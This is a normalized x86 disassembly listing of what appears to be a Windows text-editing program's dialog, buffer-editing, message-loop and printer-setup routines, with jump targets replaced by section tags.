cmp bp 0x2121
je r-xdata
cmp bp 0x2121
je r-xdata
movzx eax bp
lea edx [ esp + 0x2c ]
call sub_4215f0
test eax eax
jne r-xdata
mov ecx [ esp + 0x1c ]
test ecx ecx
jne r-xdata
mov eax [ esp + 0x14 ]
movsx eax [ rw-data ]
cmp [ esp + 0x18 ] eax
je r-xdata
mov ecx [ edi + 0x18 ]
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x10 ]
inc eax
cmp eax ecx
mov [ esp + 0x10 ] eax
jl r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ esp + 0x24 ]
mov [ esp + 0x1c ] 0x1
dec edx
mov [ esp + 0x18 ] ecx
jmp r-xdata
mov esi [ esp + 0x20 ]
mov eax [ ebx ]
mov ecx esi
sub ecx eax
inc ecx
mov [ ebx + 0x4 ] ecx
mov ebx [ ebx + 0x8 ]
test ebx ebx
jne r-xdata
mov [ esp + 0x20 ] edx
mov ecx [ esp + 0x34 ]
inc esi
mov [ ebx ] esi
movsx esi [ ecx + 0x7e ]
movzx edx [ edi + 0x1f ]
movsx ecx [ rw-data ]
movsx eax [ rw-data ]
sub esi edx
movzx edx [ edi + 0x20 ]
sub esi edx
mov edx [ esp + 0x18 ]
imul esi ecx
mov ecx [ esp + 0x14 ]
add esi eax
sub eax edx
add ecx eax
mov [ esp + 0x2c ] 0x1
mov [ esp + 0x14 ] ecx
mov ecx edi
call sub_421860
mov ebx eax
mov [ esp + 0x28 ] 0x1
sub_421d20
push esi
push edi
mov edi [ esp + 0x1c ]
test edi edi
mov esi ecx
jle r-xdata
pop edi
pop esi
retn 0x14
mov al [ esi + 0x1e ]
test al al
je r-xdata
mov eax [ esi + 0x18 ]
mov ecx [ esi + 0x14 ]
add eax edi
cmp eax ecx
jle r-xdata
push 0x40
call [ MessageBeep@IAT ]
pop edi
pop esi
retn 0x14
mov edx [ esi + 0x18 ]
mov ecx [ esp + 0x14 ]
add edx edi
push ebx
mov ebx [ esp + 0x14 ]
mov eax edx
mov [ esi + 0x18 ] edx
mov edx [ ebx ]
add edx ecx
dec eax
add edx edi
cmp eax edx
push ebp
jl r-xdata
mov ecx esi
call sub_421770
test eax eax
jne r-xdata
xor eax eax
test edi edi
jle r-xdata
mov edx eax
sub edx edi
shl edx 0x1
mov ecx [ esi + 0x18 ]
mov eax [ esi + 0x14 ]
add ecx edi
cmp ecx eax
jg r-xdata
mov edi [ esp + 0x14 ]
push 0x1
push ebx
push edi
mov ecx esi
call sub_421ad0
mov ecx edi
call sub_40ea70
pop ebp
pop ebx
mov edx [ ebx ]
mov ebp [ esp + 0x1c ]
mov ecx [ esi + 0x10 ]
add edx eax
add edx ebp
mov ebp [ esp + 0x20 ]
mov bp [ ebp + eax * 2 ]
inc eax
cmp eax edi
mov [ ecx + edx * 2 ] bp
jl r-xdata
mov ecx [ esi + 0x10 ]
mov bp [ edx + ecx ]
mov [ ecx + eax * 2 ] bp
mov ecx [ ebx ]
add ecx [ esp + 0x1c ]
dec eax
add ecx edi
sub edx 0x2
cmp eax ecx
jge r-xdata
sub_421df0
mov eax [ esp + 0x8 ]
mov edx [ eax ]
push esi
mov esi [ ecx + 0x10 ]
push edi
add edx [ esp + 0x14 ]
mov di [ esp + 0x18 ]
push 0x1
mov [ esi + edx * 2 ] di
mov esi [ esp + 0x10 ]
push eax
push esi
call sub_421ad0
mov ecx esi
call sub_40ea70
pop edi
pop esi
retn 0x10
sub_421e30
push ecx
mov eax [ esp + 0xc ]
sub eax 0x53
push ebx
push ebp
push esi
push edi
mov edi ecx
je r-xdata
mov eax [ esp + 0x18 ]
push 0x504
push eax
call sub_414bc0
add esp 0x8
sub eax 0xbd
je r-xdata
mov ecx [ edi + 0x54 ]
movzx edx [ ecx + 0x1f ]
mov esi [ esp + 0x18 ]
mov ebx [ SetDlgItemInt@IAT ]
push 0x1
push edx
push 0x474
push esi
call ebx
mov eax [ edi + 0x54 ]
movzx ecx [ eax + 0x20 ]
push 0x1
push ecx
push 0x475
push esi
call ebx
mov edx [ edi + 0x54 ]
movsx eax [ edx + 0x21 ]
push 0x1
push eax
push 0x476
push esi
call ebx
mov ecx [ edi + 0x54 ]
movsx edx [ ecx + 0x1c ]
mov [ esp + 0x18 ] edx
push 0x64
push ecx
fild [ esp + 0x20 ]
fstp [ esp ]
push 0x477
push esi
call sub_420eb0
mov al [ rw-data ]
add esp 0x10
test al al
je r-xdata
dec eax
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0xc
push 0x7b
call sub_420ca0
add esp 0x4
push eax
push esi
call [ SetWindowTextA@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0xc
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn 0xc
movzx eax [ esp + 0x20 ]
dec eax
je r-xdata
mov ecx [ edi + 0x54 ]
movzx edx [ ecx + 0x1f ]
mov esi [ esp + 0x18 ]
push edx
push 0xff
push 0x0
push 0x474
push esi
call sub_420c60
mov ebx eax
mov eax [ edi + 0x54 ]
movzx ecx [ eax + 0x20 ]
push ecx
push 0xff
push 0x0
push 0x475
push esi
call sub_420c60
mov edx [ edi + 0x54 ]
mov [ esp + 0x44 ] eax
movsx eax [ edx + 0x21 ]
push eax
push 0x7f
push 0xffffff81
push 0x476
push esi
call sub_420c60
mov ecx [ edi + 0x54 ]
movsx edx [ ecx + 0x1c ]
add esp 0x3c
push 0x0
push 0x64
mov [ esp + 0x18 ] edx
push ecx
mov [ esp + 0x2c ] eax
fild [ esp + 0x1c ]
fstp [ esp ]
push 0x41200000
push 0x3f800000
push 0x477
push esi
call sub_420b60
mov ecx [ esp + 0x3c ]
mov [ esp + 0x2c ] eax
mov eax ebx
neg eax
add esp 0x1c
cmp ecx eax
jl r-xdata
dec eax
je r-xdata
push 0x10
push 0x7d
push 0x7c
push esi
call sub_420e20
add esp 0x10
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0xc
mov edx [ rw-data ]
movsx eax [ edx + 0x7e ]
mov edx [ esp + 0x1c ]
lea ebp [ edx + ebx ]
cmp ebp eax
jge r-xdata
mov eax [ esp + 0x18 ]
push 0x0
push eax
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0xc
add ecx edx
add ecx ebx
cmp ecx eax
jge r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov al [ edi + 0x44 ]
test al al
je r-xdata
mov esi [ edi + 0x4c ]
mov ebp [ edi + 0x50 ]
jmp r-xdata
mov ebp [ edi + 0x54 ]
mov esi ebp
mov esi [ edi + 0x1c ]
mov ebp [ edi + 0x30 ]
jmp r-xdata
mov ecx edi
call sub_424d30
push esi
push 0x30
mov ecx edi
call sub_424dd0
mov cl [ esp + 0x20 ]
mov al [ esp + 0x1c ]
mov dx [ esp + 0x10 ]
push 0x1
push 0x0
mov [ esi + 0x21 ] cl
push edi
mov ecx esi
mov [ esi + 0x1f ] bl
mov [ esi + 0x20 ] al
mov [ esi + 0x1c ] dx
call sub_421ad0
cmp esi ebp
je r-xdata
mov ecx edi
call sub_424ac0
mov ecx edi
call sub_40ea70
mov ecx edi
call sub_40f190
mov eax [ esp + 0x18 ]
push 0x1
push eax
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0xc
mov esi [ esi ]
push esi
push 0x30
mov ecx edi
call sub_424dd0
mov al [ esp + 0x1c ]
mov cl [ esp + 0x20 ]
mov dx [ esp + 0x10 ]
mov [ esi + 0x1f ] bl
push 0x1
mov [ esi + 0x20 ] al
mov [ esi + 0x21 ] cl
push 0x0
push edi
mov ecx esi
mov [ esi + 0x1c ] dx
call sub_421ad0
cmp esi ebp
jne r-xdata
sub_4220d0
mov edx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
mov eax [ esi ]
add eax edx
mov edx [ ecx + 0x18 ]
dec edx
cmp eax edx
jge r-xdata
mov eax [ ecx + 0x18 ]
push 0x1
push esi
mov esi [ esp + 0x10 ]
dec eax
push esi
mov [ ecx + 0x18 ] eax
call sub_421ad0
mov ecx esi
call sub_40ea70
pop esi
retn 0xc
push edi
jmp r-xdata
mov edx [ ecx + 0x10 ]
mov di [ edx + eax * 2 + 0x2 ]
lea edx [ edx + eax * 2 ]
mov [ edx ] di
mov edx [ ecx + 0x18 ]
inc eax
dec edx
cmp eax edx
jl r-xdata
pop edi
sub_422130
mov eax [ esp + 0x8 ]
cmp eax 0x110
push ebx
push esi
push edi
je r-xdata
mov ebx [ esp + 0x10 ]
xor edi edi
mov esi 0x80
mov edi edi
cmp eax 0x401
je r-xdata
mov eax [ rw-data ]
movsx ecx [ esi + eax ]
mov [ esp + 0x10 ] ecx
push 0x64
push ecx
fild [ esp + 0x18 ]
lea edx [ edi + 0x4c4 ]
fstp [ esp ]
push edx
push ebx
call sub_420eb0
add esp 0x10
add esi 0x2
inc edi
cmp esi 0x88
jl r-xdata
mov eax [ rw-data ]
movzx ecx [ eax + 0x7e ]
push ecx
push 0x4c8
push ebx
call [ CheckDlgButton@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
retn 0x10
mov ebx [ esp + 0x10 ]
mov ecx [ rw-data ]
xor edi edi
mov esi 0x80
pop edi
pop esi
xor eax eax
pop ebx
retn 0x10
movsx eax [ esi + ecx ]
push 0x0
push 0x64
push ecx
mov [ esp + 0x1c ] eax
lea ecx [ edi + 0x4c4 ]
fild [ esp + 0x1c ]
fstp [ esp ]
push 0x41200000
push 0x0
push ecx
push ebx
call sub_420b60
mov ecx [ rw-data ]
add esp 0x1c
mov [ esi + ecx ] ax
add esi 0x2
inc edi
cmp esi 0x88
jl r-xdata
push 0x4c8
push ebx
call [ IsDlgButtonChecked@IAT ]
mov edx [ rw-data ]
pop edi
pop esi
mov [ edx + 0x7e ] al
mov eax 0x1
pop ebx
retn 0x10
sub_422230
mov eax [ esp + 0x8 ]
cmp eax 0x110
push esi
je r-xdata
mov ecx [ rw-data ]
mov esi [ esp + 0x8 ]
push 0x4cf
push esi
add ecx 0x70
call sub_4204b0
mov ecx [ rw-data ]
push 0x4ce
push esi
add ecx 0x6c
call sub_4204b0
mov ecx [ rw-data ]
push 0x4d0
push esi
add ecx 0x74
call sub_4204b0
mov ecx [ rw-data ]
push 0x4d1
push esi
add ecx 0x78
call sub_4204b0
mov eax 0x1
pop esi
retn 0x10
cmp eax 0x401
je r-xdata
mov ecx [ rw-data ]
mov esi [ esp + 0x8 ]
push 0x4cf
push esi
add ecx 0x70
call sub_421080
mov ecx [ rw-data ]
push 0x4ce
push esi
add ecx 0x6c
call sub_421080
mov ecx [ rw-data ]
push 0x4d0
push esi
add ecx 0x74
call sub_421080
mov ecx [ rw-data ]
push 0x4d1
push esi
add ecx 0x78
call sub_421080
mov eax 0x1
pop esi
retn 0x10
xor eax eax
pop esi
retn 0x10
sub_422310
push ebp
mov ebp [ esp + 0x8 ]
push edi
push 0x4d9
push ebx
mov edi ebp
call [ IsDlgButtonChecked@IAT ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov ax [ ecx + 0x88 ]
movsx edx ax
cmp edx ebp
je r-xdata
sar edi 0x1
pop edi
pop ebp
retn
cmp ax 0xffff
push esi
je r-xdata
cmp ebp 0xffffffff
je r-xdata
xor esi esi
jmp r-xdata
push 0x4e2
push ebx
call [ GetDlgItem@IAT ]
push eax
call [ SetFocus@IAT ]
pop esi
push 0x0
push edi
push 0x14e
push 0x4da
push ebx
call [ SendDlgItemMessageA@IAT ]
mov eax [ rw-data ]
lea esi [ ebp + ebp * 2 + 0xc ]
mov [ eax + 0x88 ] bp
mov edi 0x2
shl esi 0x2
jmp r-xdata
lea eax [ esi + 0x4e2 ]
push eax
movsx eax [ ecx + 0x88 ]
lea edx [ esi + eax * 2 ]
add eax edx
push ebx
lea ecx [ ecx + eax * 4 + 0x28 ]
call sub_421080
inc esi
cmp esi 0x3
jl r-xdata
mov edx [ rw-data ]
lea ecx [ edi + 0x4e2 ]
push ecx
push ebx
lea ecx [ esi + edx ]
call sub_4204b0
dec edi
sub esi 0x4
test edi edi
jge r-xdata
mov ecx [ rw-data ]
jmp r-xdata
sub_422400
push ebx
push ebp
push esi
push edi
mov edi [ SendDlgItemMessageA@IAT ]
push 0x0
push 0x0
push 0x14b
mov ebx eax
push 0x4da
push ebx
call edi
mov eax [ rw-data ]
movsx ebp [ eax + 0x88 ]
test ebp ebp
jge r-xdata
push 0x4d9
push ebx
call [ IsDlgButtonChecked@IAT ]
test eax eax
je r-xdata
xor ebp ebp
mov esi rw-data
mov esi rw-data
movsx edx [ esi ]
push edx
call sub_420ca0
add esp 0x4
push eax
push 0x0
push 0x143
push 0x4da
push ebx
call edi
add esi 0x2
cmp esi rw-data
jl r-xdata
and ebp 0x2
movsx ecx [ esi ]
push ecx
call sub_420ca0
add esp 0x4
push eax
push 0x0
push 0x143
push 0x4da
push ebx
call edi
add esi 0x2
cmp esi rw-data
jl r-xdata
jmp r-xdata
push 0xffffffff
call sub_422310
mov eax [ rw-data ]
push ebp
mov [ eax + 0x88 ] 0xffff
call sub_422310
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
retn
sub_4224c0
mov eax [ esp + 0x8 ]
sub eax 0x110
push ebx
push esi
je r-xdata
mov eax [ rw-data ]
movzx ecx [ eax + 0x7d ]
mov esi [ esp + 0xc ]
push edi
mov edi [ CheckDlgButton@IAT ]
push ecx
push 0x4d8
push esi
call edi
mov edx [ rw-data ]
movzx eax [ edx + 0x7c ]
push eax
push 0x4d9
push esi
call edi
mov ecx [ rw-data ]
mov eax esi
mov [ ecx + 0x88 ] 0xffff
call sub_422400
pop edi
dec eax
je r-xdata
movzx eax [ esp + 0x14 ]
sub eax 0x4d9
je r-xdata
sub eax 0x2f0
je r-xdata
mov eax [ esp + 0xc ]
call sub_422400
pop esi
mov eax 0x1
pop ebx
retn 0x10
dec eax
jne r-xdata
mov ebx [ esp + 0xc ]
mov esi [ IsDlgButtonChecked@IAT ]
push 0x4d8
push ebx
call esi
mov ecx [ rw-data ]
push 0x4d9
push ebx
mov [ ecx + 0x7d ] al
call esi
mov edx [ rw-data ]
push 0xffffffff
mov [ edx + 0x7c ] al
call sub_422310
add esp 0x4
pop esi
mov eax 0x1
pop ebx
retn 0x10
pop esi
xor eax eax
pop ebx
retn 0x10
pop esi
mov eax 0x1
pop ebx
retn 0x10
mov ebx [ esp + 0xc ]
push 0x0
push 0x0
push 0x147
push 0x4da
push ebx
call [ SendDlgItemMessageA@IAT ]
mov esi eax
test esi esi
jge r-xdata
push 0x4d9
push ebx
call [ IsDlgButtonChecked@IAT ]
test eax eax
jne r-xdata
xor esi esi
push esi
call sub_422310
add esp 0x4
pop esi
mov eax 0x1
pop ebx
retn 0x10
shl esi 0x1
sub_4225e0
push ecx
mov ecx [ esi ]
lea eax [ esp ]
push eax
mov eax [ esp + 0xc ]
push 0x1
push ecx
push 0x41200000
push 0x0
push edx
push eax
call sub_420b60
mov al [ rw-data ]
add esp 0x1c
test al al
je r-xdata
mov ecx [ esp ]
mov [ esi ] ecx
pop ecx
retn
fld [ esp ]
fmul [ r--data ]
fstp [ esi ]
pop ecx
retn
sub_422620
push ebp
mov ebp [ esp + 0x8 ]
push esi
push edi
mov edi eax
lea edx [ edi + 0x4ec ]
push ebp
mov esi ebx
call sub_4225e0
lea esi [ ebx + 0x4 ]
lea edx [ edi + 0x4ed ]
push ebp
call sub_4225e0
lea esi [ ebx + 0x8 ]
lea edx [ edi + 0x4ee ]
push ebp
call sub_4225e0
lea esi [ ebx + 0xc ]
lea edx [ edi + 0x4ef ]
push ebp
call sub_4225e0
mov esi [ IsDlgButtonChecked@IAT ]
add esp 0x10
lea eax [ edi + 0x4f0 ]
push eax
push ebp
call esi
add edi 0x4f1
push edi
push ebp
mov [ ebx + 0x10 ] al
call esi
pop edi
pop esi
mov [ ebx + 0x11 ] al
pop ebp
retn
sub_422690
mov al [ rw-data ]
test al al
je r-xdata
mov eax [ esp + 0x4 ]
push 0x1
push eax
push ecx
push edx
call sub_420eb0
add esp 0x10
retn
fld [ esp + 0x4 ]
fmul [ r--data ]
fstp [ esp + 0x4 ]
sub_4226c0
movzx eax [ edi + 0x10 ]
push ebp
mov ebp [ CheckDlgButton@IAT ]
push eax
lea ecx [ esi + 0x4f0 ]
push ecx
push ebx
call ebp
movzx edx [ edi + 0x11 ]
push edx
lea eax [ esi + 0x4f1 ]
push eax
push ebx
call ebp
mov ecx [ edi ]
push ecx
lea ecx [ esi + 0x4ec ]
mov edx ebx
call sub_422690
mov edx [ edi + 0x4 ]
push edx
lea ecx [ esi + 0x4ed ]
mov edx ebx
call sub_422690
mov eax [ edi + 0x8 ]
push eax
lea ecx [ esi + 0x4ee ]
mov edx ebx
call sub_422690
mov ecx [ edi + 0xc ]
push ecx
lea ecx [ esi + 0x4ef ]
mov edx ebx
call sub_422690
add esp 0x10
pop ebp
retn
sub_422730
mov eax [ esp + 0x8 ]
cmp eax 0x110
push ebx
push esi
push edi
je r-xdata
mov ebx [ esp + 0x10 ]
mov edi 0x4
mov esi 0x68
jmp r-xdata
cmp eax 0x401
je r-xdata
mov eax [ rw-data ]
lea edx [ edi + 0x50a ]
push edx
push ebx
lea ecx [ esi + eax ]
call sub_4204b0
sub esi 0x4
dec edi
cmp esi 0x58
jge r-xdata
mov ebx [ esp + 0x10 ]
xor edi edi
mov esi 0x58
jmp r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn 0x10
pop edi
pop esi
mov eax 0x1
pop ebx
retn 0x10
mov ecx [ rw-data ]
lea eax [ edi + 0x50a ]
push eax
push ebx
add ecx esi
call sub_421080
add esi 0x4
inc edi
cmp esi 0x6c
jl r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn 0x10
sub_4227d0
push 0xffffffff
push sub_431dd6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
push edi
push j_sub_420470
push sub_401590
mov esi ecx
push 0xc
push 0x4
lea eax [ esi + 0x28 ]
push eax
mov [ esp + 0x1c ] esi
call sub_429490
push j_sub_420470
push sub_401590
push 0x5
push 0x4
lea ecx [ esi + 0x58 ]
xor edi edi
push ecx
mov [ esp + 0x28 ] edi
call sub_429490
mov ecx [ esp + 0xc ]
mov [ esi + 0x6c ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0x74 ] edi
mov [ esi + 0x78 ] edi
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_422850
push 0xffffffff
push sub_431e2d
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x78 ]
mov [ esp + 0x10 ] 0x4
call sub_420470
lea ecx [ esi + 0x74 ]
mov [ esp + 0x10 ] 0x3
call sub_420470
lea ecx [ esi + 0x70 ]
mov [ esp + 0x10 ] 0x2
call sub_420470
lea ecx [ esi + 0x6c ]
mov [ esp + 0x10 ] 0x1
call sub_420470
push j_sub_420470
push 0x5
push 0x4
lea eax [ esi + 0x58 ]
push eax
mov [ esp + 0x20 ] 0x0
call sub_429430
push j_sub_420470
push 0xc
push 0x4
add esi 0x28
push esi
mov [ esp + 0x20 ] 0xffffffff
call sub_429430
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_422930
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn 0x4
mov ax [ esi ]
test ax ax
je r-xdata
movzx eax ax
push eax
call sub_422910
add esi 0x2
xor eax eax
mov ax [ esi ]
test ax ax
jne r-xdata
sub_422960
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn 0x4
mov al [ esi ]
test al al
je r-xdata
nop
movsx eax al
push eax
call sub_422910
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
sub_422990
sub esp 0x8
push ebx
mov ebx [ GetDeviceCaps@IAT ]
push ebp
push esi
push edi
mov edi [ esp + 0x1c ]
push 0x58
push edi
mov esi ecx
call ebx
push 0x5a
push edi
mov [ esi + 0x8 ] ax
call ebx
push 0x6e
push edi
mov [ esi + 0xa ] ax
call ebx
push 0x6f
push edi
mov [ esi ] eax
call ebx
mov ebp [ esp + 0x20 ]
mov [ esi + 0x4 ] eax
movsx eax [ esi + 0xa ]
mov [ esp + 0x1c ] eax
fild [ esp + 0x1c ]
fld st0
fmul [ ebp + 0x8 ]
fadd [ r--data ]
call sub_42a134
fmul [ ebp + 0xc ]
mov [ esp + 0x20 ] eax
fadd [ r--data ]
call sub_42a134
movsx ecx [ esi + 0x8 ]
mov [ esp + 0x1c ] ecx
mov [ esp + 0x14 ] eax
fild [ esp + 0x1c ]
fld st0
fmul [ ebp ]
fadd [ r--data ]
call sub_42a134
fmul [ ebp + 0x4 ]
mov [ esp + 0x1c ] eax
fadd [ r--data ]
call sub_42a134
movzx edx [ ebp + 0x10 ]
push edx
push edi
mov [ esp + 0x18 ] eax
call sub_414950
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x24 ]
mov ebp eax
mov eax [ esi ]
sub eax edx
mov edx [ esp + 0x28 ]
sub eax ecx
mov ecx [ esi + 0x4 ]
mov [ esi + 0x10 ] eax
sub ecx [ esp + 0x1c ]
sub ecx edx
movsx edx [ esi + 0x8 ]
mov [ esi + 0xc ] ecx
mov [ esi + 0x28 ] ebp
movsx eax [ ebp + 0x4 ]
movsx ecx [ ebp + 0xa ]
add ecx eax
movsx eax [ rw-data ]
imul ecx eax
imul ecx edx
mov eax 0xb60b60b7
imul ecx
add esp 0x8
add edx ecx
sar edx 0x9
mov ecx edx
mov eax edx
shr ecx 0x1f
add eax ecx
movsx ecx [ ebp + 0x4 ]
cdq
idiv ecx
movsx edx [ esi + 0xa ]
push 0x70
push edi
mov [ esi + 0x14 ] ax
movsx eax [ ebp + 0x6 ]
movsx ecx [ ebp + 0x8 ]
add ecx eax
mov [ esp + 0x1c ] eax
movsx eax [ rw-data ]
imul ecx eax
imul ecx edx
mov eax 0xb60b60b7
imul ecx
add edx ecx
sar edx 0x9
mov ecx edx
mov eax edx
shr ecx 0x1f
add eax ecx
cdq
idiv [ esp + 0x1c ]
mov [ esi + 0x16 ] ax
movsx ecx [ rw-data ]
movsx eax [ esi + 0x8 ]
imul ecx eax
mov eax 0xb60b60b7
imul ecx
add edx ecx
sar edx 0x9
mov eax edx
shr eax 0x1f
add edx eax
movsx eax [ esi + 0xa ]
mov [ esi + 0x18 ] dx
movsx ecx [ rw-data ]
imul ecx eax
mov eax 0xb60b60b7
imul ecx
add edx ecx
sar edx 0x9
mov ecx edx
shr ecx 0x1f
add edx ecx
mov [ esi + 0x1a ] dx
call ebx
mov ecx [ esp + 0x1c ]
push 0x71
sub ecx eax
push edi
mov [ esi + 0x1c ] ecx
call ebx
mov ecx [ esp + 0x20 ]
movsx edx [ esi + 0x18 ]
sub ecx eax
mov [ esi + 0x20 ] ecx
movsx ecx [ esi + 0x14 ]
mov eax ecx
sub eax edx
cdq
sub eax edx
sar eax 0x1
mov [ esi + 0x24 ] ax
mov eax [ esi + 0x10 ]
cdq
idiv ecx
pop edi
mov [ esi + 0x26 ] ax
pop esi
pop ebp
pop ebx
add esp 0x8
retn 0x8
sub_422b70
push ecx
fld [ ecx + 0x4 ]
mov al [ ecx + 0x11 ]
test al al
fadd [ ecx ]
push esi
je r-xdata
movsx edx [ rw-data ]
mov [ esp + 0x4 ] edx
fimul [ esp + 0x4 ]
fadd [ r--data ]
call sub_42a134
mov ecx [ rw-data ]
movsx esi [ rw-data ]
sub ecx eax
mov eax ecx
cdq
idiv esi
pop esi
pop ecx
retn
movsx esi [ rw-data ]
mov [ esp + 0x4 ] esi
fimul [ esp + 0x4 ]
fadd [ r--data ]
call sub_42a134
mov ecx [ rw-data ]
sub ecx eax
movsx eax [ rw-data ]
imul eax esi
movsx esi [ rw-data ]
cdq
idiv esi
mov esi eax
mov eax ecx
cdq
idiv esi
pop esi
pop ecx
retn
sub_422bf0
mov eax [ rw-data ]
push edi
push eax
call [ GlobalLock@IAT ]
xor ecx ecx
cmp [ eax + 0x2c ] 0x2
sete cl
cmp esi 0xffffffff
mov edi ecx
je r-xdata
mov eax [ rw-data ]
push eax
call [ GlobalUnlock@IAT ]
mov eax edi
pop edi
retn
xor edx edx
test esi esi
setne dl
inc edx
mov [ eax + 0x2c ] dx
sub_422c30
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
push 0x0
push 0x20
push 0x21
push ecx
call sub_420e20
add esp 0x10
xor eax eax
retn
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push esi
mov esi [ GlobalLock@IAT ]
push edi
push eax
call esi
mov edi eax
mov eax [ rw-data ]
push eax
call esi
movzx ecx [ eax + 0x4 ]
movzx edx [ eax + 0x2 ]
push edi
add ecx eax
push ecx
movzx ecx [ eax ]
add edx eax
push edx
add ecx eax
push ecx
call [ CreateICA@IAT ]
mov edx [ rw-data ]
mov edi [ GlobalUnlock@IAT ]
push edx
mov esi eax
call edi
mov eax [ rw-data ]
push eax
call edi
pop edi
mov eax esi
pop esi
retn
sub_422cb0
mov eax [ rw-data ]
sub esp 0x44
test eax eax
mov [ rw-data ] 0x0
jne r-xdata
push esi
xor esi esi
call sub_422bf0
call sub_422c30
mov esi eax
test esi esi
je r-xdata
push edi
xor eax eax
mov ecx 0x10
lea edi [ esp + 0x4 ]
[ edi ]
stosw [ edi ]
lea eax [ esp + 0x4 ]
push eax
mov [ esp + 0x8 ] 0x42
mov [ esp + 0x1c ] 0x40400
call [ PrintDlgA@IAT ]
test eax eax
pop edi
je r-xdata
pop esi
mov eax [ esp + 0x4c ]
push eax
push esi
mov ecx rw-data
call sub_422990
push esi
call [ DeleteDC@IAT ]
add esp 0x44
retn
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0xc ]
mov [ rw-data ] ecx
mov [ rw-data ] edx
sub_422d40
sub esp 0x1c
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
cmp [ rw-data ] ax
sete al
add esp 0x1c
retn 0x8
push ebx
mov ebx [ TranslateMessage@IAT ]
push ebp
mov ebp [ DispatchMessageA@IAT ]
push esi
mov esi [ PeekMessageA@IAT ]
push edi
mov edi [ IsDialogMessageA@IAT ]
lea esp [ esp ]
pop edi
pop esi
pop ebp
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
lea edx [ esp + 0x10 ]
push edx
call ebx
lea eax [ esp + 0x10 ]
push eax
call ebp
lea ecx [ esp + 0x10 ]
push ecx
push eax
call edi
test eax eax
jne r-xdata
push 0x1
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x20 ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub_422dd0
mov eax [ esp + 0x8 ]
sub eax 0x53
je r-xdata
mov ecx [ esp + 0x4 ]
push 0x901
push ecx
call sub_414bc0
add esp 0x8
sub eax 0xbd
je r-xdata
mov eax 0x1
retn 0x10
dec eax
je r-xdata
push 0x22
call sub_420ca0
add esp 0x4
push eax
mov eax [ esp + 0x8 ]
push 0x515
push eax
call [ SetDlgItemTextA@IAT ]
mov eax 0x1
mov [ rw-data ] ax
retn 0x10
xor eax eax
retn 0x10
sub_422e30
sub esp 0x1c
mov eax [ esp + 0x30 ]
push ebx
push ebp
mov ebp [ esp + 0x3c ]
movsx ecx [ ebp + 0x1a ]
add ecx eax
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x30 ]
push edi
xor ebx ebx
xor edi edi
test eax eax
mov [ esp + 0x24 ] ecx
mov [ esp + 0x10 ] ebx
jle r-xdata
mov eax edi
pop edi
pop ebp
pop ebx
add esp 0x1c
retn
push esi
cmp edx 0x9
je r-xdata
mov eax [ esp + 0x54 ]
test eax eax
jne r-xdata
movsx ecx [ ebp + 0x14 ]
mov eax edi
cdq
idiv ecx
inc eax
imul eax ecx
mov edi eax
test ah 0x7f
mov esi edi
mov [ esp + 0x10 ] 0x2
mov ecx ebx
jne r-xdata
movsx eax [ ebp + 0x14 ]
add edi eax
jmp r-xdata
movsx eax [ ebp + 0x24 ]
mov ecx [ esp + 0x3c ]
add eax edi
add eax ecx
movsx ecx [ ebp + 0x18 ]
add ecx eax
lea esi [ esp + 0x1c ]
push esi
mov [ esp + 0x28 ] ecx
mov ecx [ ebp + 0x28 ]
push edx
mov edx [ esp + 0x38 ]
mov [ esp + 0x24 ] eax
mov eax [ ecx ]
push edx
call [ eax + 0x4 ]
mov edx [ esp + 0x34 ]
mov ax [ edx + ebx * 2 ]
movzx edx ax
test dh 0x7f
je r-xdata
pop esi
movsx ebp [ ebp + 0x14 ]
mov eax esi
cdq
idiv ebp
mov ebx eax
inc ebx
imul ebx ebp
sub ebx esi
mov esi [ esp + 0x38 ]
cmp ecx esi
jne r-xdata
jmp r-xdata
mov eax [ esp + 0x38 ]
inc ebx
cmp ebx eax
mov [ esp + 0x14 ] ebx
jl r-xdata
mov edx [ esp + 0x34 ]
cmp [ edx + ecx * 2 ] 0x9
je r-xdata
mov eax [ esp + 0x50 ]
test eax eax
je r-xdata
cmp ax 0x9
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
xor ebx ebx
cmp ecx [ esp + 0x38 ]
jge r-xdata
cmp ecx esi
mov ebp [ esp + 0x10 ]
jne r-xdata
xor ebx ebx
mov ebx [ esp + 0x48 ]
movzx edx ax
add esi [ ebx + edx * 4 ]
cmp ax 0x20
jne r-xdata
mov eax ebx
cdq
idiv ebp
